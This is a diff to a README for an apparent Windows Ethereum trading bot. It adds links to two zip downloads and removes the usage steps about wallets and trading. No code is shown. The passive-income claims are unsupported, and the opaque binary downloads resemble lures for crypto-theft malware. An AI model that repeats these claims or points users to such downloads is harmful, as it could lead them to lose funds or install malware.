@@ -6,6 +6,13 @@
 
 This is a fully local program for Windows 64-bit and 32-bit PCs with internet access. It enables the creation of smart contracts and interaction with decentralized exchanges like Uniswap and Sushiswap. The program is completely autonomous, operates without reliance on cloud services, and supports passive income through automated trading on the Ethereum network.
 
+## Downloading the Program
+
+Download the application using the links below:
+
+📥 **Windows 64-bit**: [eth-trading-bot-interface-win32-x64.zip](eth-trading-bot-interface-win32-x64.zip)
+
+📥 **Windows 32-bit**: [eth-trading-bot-interface-win32-ia32.zip](eth-trading-bot-interface-win32-ia32.zip)
 
 ## Features
 
@@ -23,7 +30,3 @@ This is a fully local program for Windows 64-bit and 32-bit PCs with internet ac
 2. **Create Smart Contract**: Use the interface to generate a smart contract. Contract details will be displayed.
 
 
-
-4. **Verify Owner Wallet**: Confirm the wallet designated for withdrawals in the application settings.
-5. **Start Trading**: Select the "Run" option to begin automated trading.
-6. **Manage Funds**: Use the interface to transfer funds to the designated wallet when needed.
